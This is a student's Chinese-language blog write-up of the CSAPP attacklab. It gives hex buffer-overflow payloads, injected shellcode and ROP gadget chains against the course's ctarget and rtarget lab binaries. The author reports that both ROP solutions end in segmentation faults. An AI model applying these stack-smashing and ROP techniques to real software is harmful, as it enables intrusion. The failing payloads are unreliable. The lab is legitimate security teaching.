#! https://zhuanlan.zhihu.com/p/560012698
![image](https://w.wallhaven.cc/full/39/wallhaven-39xr96.jpg)

# CSAPP lab3: attacklab

## 碎碎念

假期真的想摸，两天能写完的 lab 硬是写了 5 天。。。
马上就开学了，结果想玩的游戏一个没玩完，真的电子游戏阳尾了

## 题目与解法

### level1

思路：这里是通过`<getbuf>`中`<Gets>`存在的缓冲区溢出的问题，来污染栈区内存，而`<test>`调用了 getbuf，调用的 call 指令会执行一个 push %rip，所以只要把此处被 push 的内存改为我们希望跳转到的位置——也就是 touch1 函数，就能完成目的
而因为 getbuf 开了 0x28 的栈内存，所以只需要填充完 0x28 个字节，接下来的 8 字节就是 ret 的位置——原来是返回 test，现在我们要执行 touch1
值得注意的是读入的数据要与期望的数据列相反（x86 是小端法存储），即如果想读如

```
01 02 03 04 05 06 07 08
c3 57 44 0f 01 00 00 00
```

则应该读如

```
08 07 06 05 04 03 02 01
00 00 00 01 0f 44 57 c3
```

解法：

1. `touch attack1.txt`
2. 在其中加入

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 /* 00000000004017c0 <touch1> */
```

3. 执行`./hex2raw < attack1.txt > attack1raw.txt`
4. `./ctarget -qi < attack1raw.txt`

### level2

思路：需要传参，而这个参数存在%rdi，所以需要注入代码完成`mov $0x59b997fa, %rdi # cookie为59B997FA`，而注入的代码当然也是在栈段（因为我们只能在此处注入），注入后再返回到 touch2，任务完成
注入的代码是机器码，所以我们需要先写汇编代码，再用 gcc 转化为机器码，再通过 objdump 查看反汇编
我们需要在 getbuf 的 ret 位置放我们注入的代码的位置，而由于现在还没有栈随机化，所以栈的位置是确定的，所以可以通过 gdb 获得位置
解法：

1. `touch attack2.txt attack2.s`
2. 在 attack2.s 中加入

```s
mov $0x59b997fa, %rdi # cookie, 59B997FA=1505335290
pushq $0x4017ec # 0x4017ec是touch2的开始地址
retq
```

3. `gcc -c attack2.s`
4. `objdump -d attack2.o > attack2.d`
   此时`cat attack2.d`，会得到

```s
attack2.o：     文件格式 elf64-x86-64
Disassembly of section .text:
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq
```

所以只需要把机器码部分添加到栈段即可

5. 在 attack2.txt 中加入

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

6. 剩下如 attack1

### level3

思路：这个阶段需要我们传入字符串格式的 cookie，其中%rdi 为字符串的首地址，由于我们只能修改栈段，所以我们要在栈段放字符串，而由于 touch3 调用的函数可能会修改栈段的内容从而导致我们的字符串被覆盖，所以我们要模仿开栈的方式`sub`指令手动开栈段（反正不会返回到 test，会自动结束程序所以不会有 segment fault）
解法：

1. 在 attack3.s 中加入如下内容

```s
sub $0x18,%rsp # 减出一个放cookie的位置
mov $0x5561dc90, %rdi # cookie首位置
pushq $0x4018fa # 0x4018fa是touch3的开始地址
retq
```

2. 得到内容后在 attack3.txt 中加入

```
48 83 ec 20 48 c7 c7 90
dc 61 55 68 fa 18 40 00
c3 00 00 00 00 00 00 00
35 39 62 39 39 37 66 61 /* 字符串 */
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

### ROP level2

接下来的两个题目都是通过 ROP(Return-Orientated Programing)方法来实现攻击的，因为现在的 level2 与 level3 都做了栈随机化与栈不可执行化操作，所以无法做代码注入
所以我们只能想办法去通过执行本身就有的代码来完成攻击（但栈段可读，所以 cookie 之类数据依然可以注入，栈段也可以放返回地址），但自身有的代码通常不能直接达成目的，所以我们要对原有的代码“断章取义”来创造自己的代码，从而完成目的
比如此处`401419: 69 c0 5f c3 00 00 imul $0xc35f,%eax,%eax`，如果直接从 40141b 处执行，则相当于执行了`5f c3`，等同于执行了`pop rdi; ret;`，这就是 ROP 攻击，而这种被断章取义的最后结尾是`ret`的东西就叫做`gadget`
此处提供一个能找 gadget 的工具（这个工具我玩的不是很溜，所以有些 gadget 用这个发现不了），是我在读这篇文章中看到的：[
Introduction to CSAPP（二十）：这可能是你能找到的最具捷径的 attacklab 了](https://zhuanlan.zhihu.com/p/104340864)
思路：如果能直接找到一句`pop rdi; ret;`，那么问题直接就解决了
解法：

1. `ROPgadget --binary ./rtarget --only "pop|ret" | grep rdi`，然后找到了这么句话
2. 据此在 attack4.txt 中加入

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1b 14 40 00 00 00 00 00 /* pop rdi ; ret */
fa 97 b9 59 00 00 00 00 /* cookie */
ec 17 40 00 00 00 00 00 /* touch2 */
```

但不知道为什么会变成这样

```shell
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00
```

但结果理论上应该是对的才对，猜测是因为题目要求在 farm 区间中选择 gadget，但我用的 gadget 不在个区间中

### ROP level3

此题难点在于栈随机化后得想办法得到栈位置，然后才能反算出 cookie 字符串的位置
思路：通过`ROPgadget --binary ./rtarget --only "mov|ret" | grep rsp`，能够找到`mov rsp,rax; ret`，然后`ROPgadget --binary ./rtarget --only "mov|ret" | grep rax`能找到`mov rax,rdi; ret`
所以我们已经解决了找 rsp 的问题，接下来的问题就是怎么想办法让 rdi 增加到我们设定的 cookie 的位置；然而通过 ROPgadget 找`add`，并没有解决问题，重新去看 rtarget 汇编代码，发现了这么一句话`lea (%rdi,%rsi,1),%rax`，问题迎刃而解，只需要设定 rsi 的值就行了，所以我们`ROPgadget --binary ./rtarget --only "pop|ret" | grep rsi`，结果还真有想要的东西，问题解决！
解法

1. 在 attack5.txt 中加入

```s
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 /* mov rsp,rax; ret */
a2 19 40 00 00 00 00 00 /* mov rax,rdi; ret */
83 13 40 00 00 00 00 00 /* pop rsi ; ret */
30 00 00 00 00 00 00 00
d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax ; ret */
a2 19 40 00 00 00 00 00 /* mov rax,rdi; ret */
fa 18 40 00 00 00 00 00 /* touch3 */
35 39 62 39 39 37 66 61 /* cookie */
00 00 00 00 00 00 00 00
```

然后这个理论上是对的才对，结果还是 segment fault 了。。。

## 感悟

1. gdb 与反汇编能力有了长进
2. 学到了一些简单的攻击方法，还挺有意思的
